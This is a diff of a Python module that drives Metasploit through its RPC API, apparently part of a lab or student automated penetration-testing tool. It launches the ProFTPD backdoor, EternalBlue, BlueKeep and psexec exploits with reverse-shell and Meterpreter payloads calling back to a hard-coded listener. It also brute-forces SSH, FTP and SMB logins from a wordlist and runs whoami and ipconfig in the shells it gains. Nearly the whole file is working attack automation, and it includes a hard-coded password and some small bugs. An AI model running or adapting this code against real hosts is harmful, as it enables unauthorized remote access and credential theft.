@@ -1,65 +1,88 @@
-# def setExploits(client, m, targetIP, port): #takes results of dirty search, target & port, and client?
-#     for x in m: ## for every result in the search?
-#         exploit = client.modules.use('exploit', x) # Uses the result of the exploit search
-#         exploit.target = 0 # WE NEED TO SPECIFY WHICH TARGET WE ARE TARGETING
-#         exploit.targetpayloads() # Need to define the common payloads and what we want - this takes the ones that work
-#         payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp') # Sets a payload we would want to use
-#         exploit['RHOSTS'] = data.get('targetIP') # Need to obtain targetIP addresss somehow
-#         exploit['RPORT'] = port # Need to specify port?
-
-
 from pymetasploit3.msfrpc import MsfRpcClient
-import time
-# import socket
+import logging, sys, random, time
 
 # TODO MAKE IT NOT HARD CODED
-LHOSTIP = '192.168.1.50'
-
-
-# Inputs: Exploit, Target, Port (Target Port)
+LHOSTIP = '192.168.1.226'
 
 class MetasploitInterface:
+    portBindings = [55553]
 
-    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass): # Just for metasploit connection
+    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, logLevel): # Just for metasploit connection
+        self.verbosity = logLevel
         self.metasploit_ip = metasploit_ip
         self.metasploit_port = metasploit_port
         self.metasploit_pass = metasploit_pass
         self.client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
-        print(self.client)
-    
-    # def connectMetasploit(self):
-    #     client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
-    #     print(f"Client Connected {client}")
-    #     return client
+        self.cid = self.client.consoles.console().cid
+        # self.verbosity = verbosity
+        print(f"MSFRPCD API Connected @ {self.metasploit_ip}:{self.metasploit_port}")
+        print(f"MSFRPCD OBJ: {self.client}")
+
+    def reset(self):
+        try:
+            self.client.consoles.console(self.cid).destroy
+        except:
+            print('error')
+            pass
+        
+        self.cid = self.client.consoles.console().cid
 
     def run(self, target, exploit, port): # This will just take in the info and use it   - does it just turn into self.client.etc?
-        success, user_level = False, ''
+        success, user_level, results = False, '', ''
         # switch statement to select exploit
-        if(exploit == 'auxiliary/scanner/ftp/anonymous'):
-            success, user_level, exploit = self.scanFTP(target, exploit, port)
+        try:
+            if(exploit == 'auxiliary/scanner/ftp/anonymous'):
+                success, user_level, results = self.scanFTPAnon(target, exploit, port)
 
-        elif(exploit == 'exploit/unix/ftp/proftpd_133c_backdoor'):
-            success, user_level, exploit = self.exploitFTP(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/ftp/ftp_login'):
+                success, user_level, results = self.scanFTPLogin(target, exploit, port)
 
-        elif(exploit == 'exploit/windows/smb/ms17_010_eternalblue'):
-            success, user_level, exploit = self.eternalBlue(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/ftp/ftp_version'):
+                success, user_level, results = self.scanFTPversion(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/rdp/rdp_scanner'):
-            success, user_level, exploit = self.rdpScanner(target, exploit, port)
+            elif(exploit == 'exploit/unix/ftp/proftpd_133c_backdoor'):
+                success, user_level, results = self.exploitFTP(target, exploit, port)
+
+            elif(exploit == 'auxiliary/scanner/smb/smb_ms17_010'):
+                success, user_level, results = self.scanEternalBlue(target, exploit, port)
+
+            elif(exploit == 'exploit/windows/smb/ms17_010_eternalblue'):
+                success, user_level, results = self.exploitEternalBlue(target, exploit, port)
+
+            elif(exploit == 'auxiliary/scanner/rdp/rdp_scanner'):
+                success, user_level, results = self.rdpScanner(target, exploit, port)
+
+            elif(exploit == 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'):
+                success, user_level, results = self.scanBlueKeep(target, exploit, port)
+            
+            elif(exploit == 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'):
+                success, user_level, results = self.exploitBlueKeep(target, exploit, port)
+
+            elif(exploit == 'auxiliary/scanner/ssh/ssh_login'):
+                success, user_level, results = self.scanSSHlogin(target, exploit, port)
+            
+            elif(exploit == 'auxiliary/scanner/ssh/ssh_version'):
+                success, user_level, results = self.scanSSHversion(target, exploit, port)
+
+            elif(exploit == 'auxiliary/scanner/smb/smb_version'):
+                success, user_level, results = self.scanSMBversion(target, exploit, port)
+
+            elif(exploit == 'auxiliary/scanner/smb/smb_login'):
+                success, user_level, results = self.scanSMBlogin(target, exploit, port)
+            else:
+                print(f"{exploit}: Not implemented")
+                return 0, "", ""
+        except:
+            print('sessionID being reset action failed')
+            self.reset()
+            return 0, "", ""
         
-        else:
-            print("No function picked")
-        
-        return success, user_level, exploit
+        return success, user_level, results
 
     def exploitFTP(self, target, exploit, port):
-        """ SETS UP THE MSFRPC API CLIENT"""
-        success, user_level = False, ''
-        split_string = exploit.split('/')
-        original_exploit = exploit ## obtains the full original exploit string for return
-
-        module = split_string[0]
-        specific_module = "/".join(split_string[1:])
+        """ SETS UP INITIAL VARIABLES FOR RETURN AND OBTAINS MODULE INFORMATION"""
+        success, user_level, address_properties = False, '',''
+        module, specific_module = self.getModuleInfo(exploit)
         
         """ SETS UP EXPLOIT and TARGET"""
         exploit = self.client.modules.use(module, specific_module)
@@ -69,250 +92,650 @@ class MetasploitInterface:
      
         """ SETS PAYLOAD FOR EXPLOIT & LOCAL HOST ADDRESS???"""
         payload = self.client.modules.use('payload', 'cmd/unix/reverse')
-        
+        localPort = self.generateLPORT()
         payload['LHOST'] = LHOSTIP
+        payload['LPORT'] = localPort
         
-        """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT results"""
-        cid = self.client.consoles.console().cid
-        try:
-            sid_before = list(self.client.sessions.list.keys())[-1]
-            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
-            sid_after = list(self.client.sessions.list.keys())[-1]
+        
+        """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT RESULTS"""
+        
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)
 
-        except IndexError:
-            sid_before = 0
-            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
-            try:
-                sid_after = list(self.client.sessions.list.keys())[-1]
-            except IndexError:
-                print("No sessions on start and host not vulnerable")
-                sid_after = 0
+        if self.verbosity == "INFO":
+                print(results)
+
+        number = -1
+        if "Command shell session" in results:
+            lines = results.split("\n")
+            for line in lines:
+                if "created in the background" in line:
+                    number = line.split(" ")[2]
+                    
         
-        if(sid_before == sid_after):
-            # print("SIDs DO MATCH - Did not work")
-            print("There was an issue creating a session or the host is not vulnerable (see below): ")
+        if number == -1:
+            user_level = ""
+            success = False;
+            return  success, user_level, results
+        
+        try:
+            shell = self.client.sessions.session(number)
+            shell.write('whoami')
+                
+            user_level = shell.read()
+                
+            shell.write('ifconfig')
+            address_properties = shell.read()
+            
+            success = True
+            
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"User_Level: {user_level}")
+                print(f"Address properties: \n {address_properties}")
+            
+        except Exception as e:
+            if self.verbosity == "DEBUG":
+                print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')
+
             user_level = ""
             success = False
 
-        else: 
-            try:
-                # print("SIDs DON'T MATCH - Worked")
-                shell = self.client.sessions.session(sid_after)
-                print("Exploit was successful! Here are the results: ")
-                shell.write('whoami')
-                user_level = shell.read()
-                print("User Level: " + user_level)
-                shell.write('ifconfig')
-                address_properties = shell.read()
-                print("Address Properties: \n" + address_properties)
-                success = True
-                # print("\n\n\nCID: " + str(int(cid)+1))  - Error catching for CID
-
-            except Exception as e:
-                print("There was an issue creating a session or the host is not vulnerable (see below): ")
-                print(e)
-                user_level = "No access"
-                success = False
-            
+        try:
+            self.client.sessions.session(number).stop()
+        except Exception:
+            pass
+        self.portBindings.remove(localPort)
         
-        self.client.consoles.console(cid).destroy
-        
-        ##print(exploit.targetpayloads())
-        return success, user_level, original_exploit
+        return success, user_level, results
         
     
-    def scanFTP(self, target, exploit, port):
-        """ SETS UP THE MSFRPC API CLIENT"""
+    def scanFTPAnon(self, target, exploit, port):
+        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
         success, user_level = False, ''
-        original_exploit = exploit ## obtains the full exploit for return
-
-        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
+        module, specific_module = self.getModuleInfo(exploit)
         
-        """ SETS UP EXPLOIT and TARGET"""
-        module = split_string[0]
-        specific_module = "/".join(split_string[1:])
 
+        """ SETS UP USAGE OF METASPLOIT MODULE AND TARGET"""
         exploit = self.client.modules.use(module, specific_module)
-        # print(exploit.missing_required)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
-
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        print(results)
        
+        """ CREATION OF CONSOLE, EXPLOIT RUN AND RESULTS RETURNED"""
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        
+        if self.verbosity == "INFO":
+            print(results)
+        
+        """ PARSING RESULTS TO SET APPROPRIATE VALUES FOR RETURN"""
         if "Anonymous READ" in results:
             success = True
             user_level = "USER_ACCESS"
+            if self.verbosity == "INFO":
+                print(f'Success: {success}')
+                print(f'User Level: {user_level}')
         else:
             success = False
             user_level = ""
+            if self.verbosity == "DEBUG":
+                print(f'Success: {success}')
+                print(f'User Level: {user_level}')
 
-        return success, user_level, original_exploit
+        # self.client.consoles.console(self.cid).destroy
+
+        return success, user_level, results
 
 
-    def eternalBlue(self, target, exploit, port):
-        success, user_level = False, ''
-        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
-        original_exploit = exploit
+    def exploitEternalBlue(self, target, exploit, port):
+        """ SETS UP VARIABLES AND MODULE INFORMATION"""
+        success, user_level, properties = False, '', ''
+        module, specific_module = self.getModuleInfo(exploit)
 
-        module = split_string[0]
-        specific_module = "/".join(split_string[1:])
 
         """ SETS UP EXPLOIT and TARGET"""
         exploit = self.client.modules.use(module, specific_module)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
+
+        """ GENERATES LOCAL PORT TO USE"""
+        localPort = self.generateLPORT()
+
+        """ GENERATES PAYLOAD INFORMATION """
         payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
         payload['LHOST'] = LHOSTIP
-        payload['LPORT'] = 5557
+        payload['LPORT'] = localPort
         
-        """ Creates and Executes Exploit & Prints out shell results from target"""
-        cid = self.client.consoles.console().cid
-        try:
-            sid_before = list(self.client.sessions.list.keys())[-1]
-            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
-            sid_after = list(self.client.sessions.list.keys())[-1]
+        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)
+        if self.verbosity == "INFO":
+                print(results)
+        
+        number = -1
 
-        except IndexError:
-            sid_before = 0
-            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
-            try:
-                sid_after = list(self.client.sessions.list.keys())[-1]
-            except IndexError:
-                print("No sessions on start and host not vulnerable")
-                sid_after = 0
+        if "Meterpreter session" in results:
+            lines = results.split("\n")
+            for line in lines:
+                if "created in the background" in line:
+                    number = line.split(" ")[2]
         
-        if(sid_before == sid_after):
-            print("SIDs DO MATCH - Did not work")
-            print("There was an issue creating a session or the host is not vulnerable (see below): ")
+        if number == -1:
             user_level = ""
             success = False
-           
-        else:
-            try:
-                shell = self.client.sessions.session(sid_after)
-                # print(sid_after)
-                # shell.write('shell')
-                # time.sleep(3)
-                # print("Arrived at getuid command")
-                user_level = shell.run_with_output("getuid")
-                
-                user_level = user_level.split(":")[1].lstrip()
-                print("User Level: " + user_level)
-
-                directory = shell.run_with_output('pwd')
-                # print("Got to pwd command")
-
-                print("Directory Location: " + directory)
-                properties = shell.run_with_output('ipconfig')
-                # time.sleep(1)
-            
-                print(f"Address Properties:\n" + properties)
-                success = True
-            
-            except Exception as e:
-                print(e)
-                user_level = "No access"
-                success = False
+            return  success, user_level, results
         
-        self.client.consoles.console(cid).destroy
+        try:
+            shell = self.client.sessions.session(number)
+            
+            user_level = shell.run_with_output("getuid")
+            
+            user_level = user_level.split(":")[1].lstrip()
+            
+            directory = shell.run_with_output('pwd')
+            
+            properties = shell.run_with_output('ipconfig')
+        
+            if self.verbosity == "INFO":
+                print(f'User Level: {user_level}')
+                print(f'Directory Location: {directory}')
+                print(f'Address Properties:\n {properties}')
+            
+            success = True
+        
+        except Exception as e:
+            if self.verbosity == "DEBUG":
+                print(f"There was an error with Eternal Blue (see below) \n {e}")
+            user_level = ""
+            success = False
+        try:
+            self.client.sessions.session(number).stop()
+        except Exception:
+            pass
+        
+        self.portBindings.remove(localPort)
 
-        return success, user_level, original_exploit
+        return success, user_level, results
 
     def rdpScanner(self, target, exploit, port):
+        """ SETS UP INITIAL VALUES AND GETS MODULE INFO """
         success, user_level = False, ''
-        original_exploit = exploit
-
-        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
-        module = split_string[0]
-        specific_module = "/".join(split_string[1:])
+        module, specific_module = self.getModuleInfo(exploit)
 
         """ SETS UP EXPLOIT and TARGET"""
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+
+        """ CREATES CONSOLE & RUNS EXPLOIT"""
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+            print(results)
+        
+        """ PARSING OF RESULTS"""
+        if "Detected" in results:
+            success = True
+            user_level = ""
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"User_Level: {user_level}")
+        else:
+            success = False
+            user_level = ""
+
+
+        return success, user_level, results
+
+    def exploitBlueKeep(self, target, exploit, port):
+        """SETS UP INTIAL VALUES AND MODULE INFO"""
+        success, user_level, directory, properties = False, '', '',''
+        module, specific_module = self.getModuleInfo(exploit)
+
+        """ SETS UP EXPLOIT and TARGET"""
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+        # exploit["fDisableCam"] = 0
+        # exploit["TARGET"] = '7'
+        # exploit["LHOST"] = LHOSTIP
+
+        """ CREATES EXPLOIT & RUNS EXECUTION"""
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+                print(results)
+        # number = -1
+        # try:
+        #     shell = self.client.sessions.session(sid_after)
+        #     print(sid_after)
+        #     user_level = shell.run_with_output('echo %USERDOMAIN%\%USERNAME%')
+            
+        #     directory = shell.run_with_output('pwd')
+        #     properties = shell.run_with_output('ipconfig')
+        #     success = True
+        #     if self.verbosity == "INFO":
+        #         print(f'User Level: {user_level}')
+        #         print(f'Directory Location: {directory}')
+        #         print(f'Address Properties: \n {properties}')
+
+        
+        # except Exception as e:
+        #     if self.verbosity == "DEBUG":
+        #         print(f'There was an issue with BlueKeep (see below)\n {e}')
+        #     user_level = ""
+        #     success = False
+        
+        # self.client.consoles.console(self.cid).destroy
+        
+        return success, user_level, results
+        
+
+    def scanFTPLogin(self, target, exploit, port):
+        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
+        success, user_level = False, ''
+
+        if port == 135 or port == 3389 or port == 3268:
+            return False, '', ''
+
+        module, specific_module = self.getModuleInfo(exploit)
+
+        """ SETS UP EXPLOIT"""
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+        exploit["USERPASS_FILE"] = '/home/kali/bruteforce.txt'
+        exploit["BRUTEFORCE_SPEED"] = 4
+        exploit["STOP_ON_SUCCESS"] = True
+
+        """ CREATES CONSOLE & RUNS EXPLOIT"""
+        # self.cid = self.client.consoles.console().cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+
+        if self.verbosity == "INFO":
+            print(results)
+            
+
+        """ PARSES RESULTS FOR PROPER RETURN"""
+        if "Login Successful" in results:
+            success = True
+            print("Credentials found:")
+            for line in results.split("\n"):
+                if "Login Successful" in line:
+                    username = line.split(':')[3].lstrip()
+                    password = line.split(":")[4]
+                    print(f"Username: {username} Password: {password}")
+                    user_level = "USER_ACCESS"            
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"User_Level: {user_level}")
+               
+
+        # self.client.consoles.console(self.cid).destroy
+
+        return success, user_level, results
+
+    def scanBlueKeep(self, target, exploit, port):
+        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
+        success, user_level = False, ''
+        module, specific_module = self.getModuleInfo(exploit)
+
+        """ SETS UP EXPLOIT"""
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+
+        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+            print(results)
+
+        """PARSES RESULTS FOR PROPER RETURN"""
+        if "target is vulnerable" in results:
+            success = True
+            user_level = ""
+    
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"user_level")
+
+        return success, user_level, results
+
+
+    def scanEternalBlue(self, target, exploit, port):
+        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
+        success, user_level = False, ''
+        module, specific_module = self.getModuleInfo(exploit)
+
+        """ CREATES MODULE & EXPLOIT"""
         exploit = self.client.modules.use(module, specific_module)
         # print(exploit.missing_required)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
-        # exploit["LHOST"] = LHOSTIP
 
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        print(results)
-        if "Detected" in results:
+        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+            print(results)
+
+        """ PARSES RESULTS FOR PROPER RETURN"""
+        if "VULNERABLE" in results:
             success = True
             user_level = ""
-        else:
+
+        return success, user_level, results
+
+    def scanSMBlogin(self, target, exploit, port):
+        """ SETS UP THE VARIABLES AND MODULE INFORMATION"""
+        success, user_level = False, ''
+
+        if port == 21 or port == 22 or port == 593:
+            return False, '', ''
+
+        module, specific_module = self.getModuleInfo(exploit)
+
+        """ CREATS MODULE AND SETS UP EXPLOIT"""
+        exploit = self.client.modules.use(module, specific_module)        
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+        exploit["USERPASS_FILE"] = "/home/kali/bruteforce.txt"
+        exploit["BRUTEFORCE_SPEED"] = 4
+
+
+        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+            print(results)
+
+        """PARSES RESULTS FOR PROPER RETURN"""
+        if "Success" in results:
+            if self.verbosity == "INFO":
+                print("Credentials Found:")
+
+            for line in results.split("\n"):
+                if "Success" in line:
+                    username = line.split("'")[1].strip()
+                    username = username.split('\\')[1]
+                    print(username)
+            success = True
+            user_level = "USER_ACCESS"
+        
+        return success, user_level, results
+
+    def scanSMBversion(self, target, exploit, port):
+        """ SETS UP THE INITIAL VARIABLES AND MODULE INFORMATION"""
+        success, user_level = False, ''
+        module, specific_module = self.getModuleInfo(exploit)
+
+        if port != 445:
+            False, "", ""
+
+        """ CREATES MODULE & SETS UP EXPLOIT """
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+       
+        """CREATES CONSOLE & EXECUTES EXPLOIT"""
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+            print(results)
+
+        if "SMB Detected" in results:
+            success = True
+            user_level = ""
+        
+        return success, user_level, results
+
+    def scanSSHlogin(self, target, exploit, port):
+        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
+        success, user_level = False, ''
+        module, specific_module = self.getModuleInfo(exploit)
+
+        """CREATES MODULE & SETUP EXPLOIT"""
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+        exploit["USERPASS_FILE"] = '/home/kali/bruteforce.txt'
+        exploit["BRUTEFORCE_SPEED"] = 5
+        exploit["VERBOSE"] = True
+        exploit["STOP_ON_SUCCESS"] = True
+
+        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+                print(results)
+
+        number = -1
+        credentials = ''
+        # system_type = ''
+        if "Command shell session" in results:
+            lines = results.split('\n')
+            for line in lines:
+                if "Command shell session" in line:
+                    number = line.split(" ")[4]
+                if "Success" in line:
+                    credentials = line.split("'")[1]
+            if self.verbosity == "INFO":
+                print("Credentials found:")
+                print(credentials + "\n")
+
+        """DEALS WITH MICROSOFT HOST WE HAVE ONE BOX THAT IS VULNERABLE"""
+        if "Microsoft" in results:
+            try:
+                shell = self.client.sessions.session(number)
+                screen_clear = shell.run_with_output("cls", "C")
+
+                shell.write('whoami')
+                user_name = shell.read()
+                user_name = user_name.split("\n")[0]
+            
+                shell.write("cd")
+                directory = shell.read()
+                directory = directory.split("\n")[0]
+                
+                user_level = "admin"
+                
+                address_properties = shell.run_with_output('ipconfig', "C:\\")
+                address_properties = address_properties.split("C:\\")[0]
+                
+                success = True
+                if self.verbosity == "INFO":
+                    print(f"Success: {success}")
+                    print(f"User_Level: {user_level} : {user_name}")
+                    print(f"Directory: {directory}")
+                    print(f"Address properties: \n {address_properties}")
+
+            except Exception as e:
+                if self.verbosity == "DEBUG":
+                    print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')
+
+                user_level = ""
+                success = False
+           
+            return success, user_level, results
+            
+        if number == -1:
             success = False
             user_level = ""
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"User_Level: {user_level}")
 
-        return success, user_level, original_exploit
+            return success, user_level, results
+    
+        try:
+            shell = self.client.sessions.session(number)
+            shell.write('whoami')
+            
+            user_name = shell.read()
+            
+            user_level = "USER_ACCESS"
+            
+            shell.write('ifconfig')
+            address_properties = shell.read()
+            
+            success = True
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"User_Level: {user_level}")
+                print(f"Address properties: \n {address_properties}")
 
-    def blueKeep(self, target, exploit, port):
+            
+        except Exception as e:
+            if self.verbosity == "DEBUG":
+                print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')
+
+            user_level = ""
+            success = False
+
+        try:
+            self.client.sessions.session(number).stop()
+        except Exception:
+            pass
+        
+        # self.client.consoles.console(self.cid).destroy
+       
+        return success, user_level, results
+        
+
+    def scanSSHversion(self, target, exploit, port):
+        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
         success, user_level = False, ''
-        original_exploit = exploit
+        module, specific_module = self.getModuleInfo(exploit)
 
-        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
+        """CREATES MODULE & SETS UP EXPLOIT """
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
 
+
+        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+            print(results)
+
+        if "SSH server version" in results:
+            success = True
+            user_level = ""
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f'User_Level: {user_level}')
+  
+        return success, user_level, results
+
+    def scanFTPversion(self, target, exploit, port):
+        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
+        success, user_level = False, ''
+        module, specific_module = self.getModuleInfo(exploit)
+
+        """ SETS UP MODULE AND EXPLOIT"""
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+
+        """ CREATES CONSOLE AND EXECUTES MODULE"""
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        if self.verbosity == "INFO":
+            print(results)
+
+        if "FTP Banner" in results:
+            success = True
+            user_level = ""
+            if self.verbosity == "INFO":
+                print(f'Success: {success}')
+                print(f'User Level: {user_level}')
+            
+            
+
+        return success, user_level, results
+
+    # def exploitSMBpsexec(self, target, exploit, port):
+        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
+        success, user_level = False, ''
+        module, specific_module = self.getModuleInfo(exploit)
+
+        """ SETS UP MODULE AND EXPLOIT """
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        # exploit["RPORT"] = port
+        exploit["SMBPass"] = "Passw0rd!"
+        exploit["SMBUser"] = 'IEUser'
+        # exploit["StagerRetryWait"] = 10
+        
+        exploit["ConnectTimeout"] = 30
+
+        payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+
+        payload['LHOST'] = LHOSTIP
+        payload['LPORT'] = self.generateLPORT()
+        payload["StagerRetryWait"] = 10
+        payload["EXITFUNC"] = 'thread'
+        
+        """ CREATES CONSOLE & EXECUTES EXPLOIT ERROR HANDLING"""
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)
+        # print(self.client.sessions.list)
+        if self.verbosity == "INFO":
+                print(results)
+        number = -1
+        if "Meterpreter session" in results:
+            lines = results.split("\n")
+            for line in lines:
+                if "Meterpreter session" in line:
+                    number = line.split("")[4]
+
+        if number == -1:
+            success = False
+            user_level = ""
+            return success, user_level, results
+        
+        try:
+            shell = self.client.sessions.session(number)
+            
+            user_level = shell.run_with_output('echo %USERDOMAIN%\%USERNAME%')
+            directory = shell.run_with_output('pwd')
+            properties = shell.run_with_output('ipconfig')
+
+            success = True
+            if self.verbosity == "INFO":
+                print(f'User Level: {user_level}')
+                print(f'Directory Location: {directory}')
+                print(f'Address Properties:\n {properties}')
+        
+        except Exception as e:
+            if self.verbosity == "DEBUG":
+                print(e)
+            user_level = ""
+            success = False
+            
+        try:
+            self.client.sessions.session(number).stop()
+        except Exception:
+            pass
+        # self.client.consoles.console(self.cid).destroy
+
+        return success, user_level, results
+
+    """GENERATES DIFFERENT LOCAL PORTS FOR USEAGE BY EXPLOITS """
+    def generateLPORT(self):
+        localPort = random.randint(49152,65535)
+
+        while localPort in self.portBindings:
+            localPort = random.ranint(49152,65535)
+            
+        self.portBindings.append(localPort)
+
+        return localPort
+
+    """ SEPARATES AND OBTAINS MODULE INFORMATION FOR SETUP"""
+    def getModuleInfo(self, exploit):
+        split_string = exploit.split('/')
         module = split_string[0]
         specific_module = "/".join(split_string[1:])
 
-        """ SETS UP EXPLOIT and TARGET"""
-        exploit = self.client.modules.use(module, specific_module)
+        return module, specific_module
         
-        print(exploit.missing_required)
-        exploit["RHOSTS"] = target
-        exploit["fDisableCam"] = 0
-        # exploit["TARGET"] = '7'
-        # exploit["LHOST"] = LHOSTIP
-
-        cid = self.client.consoles.console().cid
-        try:
-            sid_before = list(self.client.sessions.list.keys())[-1]
-            print(self.client.consoles.console(cid).run_module_with_output(exploit))
-            sid_after = list(self.client.sessions.list.keys())[-1]
-
-        except IndexError:
-            sid_before = 0
-            print(self.client.consoles.console(cid).run_module_with_output(exploit))
-            try:
-                sid_after = list(self.client.sessions.list.keys())[-1]
-            except IndexError:
-                print("No sessions on start and host not vulnerable")
-                sid_after = 0
-        
-        if(sid_before == sid_after):
-            print("SIDs DO MATCH - Did not work")
-            print("There was an issue creating a session or the host is not vulnerable (see below): ")
-            user_level = "No access"
-            success = False
-           
-        else:
-            try:
-                shell = self.client.sessions.session(sid_after)
-                print(sid_after)
-                shell.write('echo %USERDOMAIN%\%USERNAME%')
-                time.sleep(3)
-                user_level = shell.read()
-                print("User Level: " + user_level)
-                shell.write('pwd')
-                time.sleep(3)
-                print(f"Directory Location: {shell.read()}")
-                shell.write('ipconfig')
-                time.sleep(3)
-                print(f"Address Properties:\n {shell.read()}")
-                success = True
-            
-            except Exception as e:
-                print(e)
-                user_level = "No access"
-                success = False
-        
-        self.client.consoles.console(cid).destroy
-
-        return success, user_level, original_exploit
-        # print(self.client.consoles.console(cid).run_module_with_output(exploit))
-
-
 # functions_list = [exploitFTP, scanFTP, eternalBlue, rdpScanner, blueKeep]
 
 # Outputs:
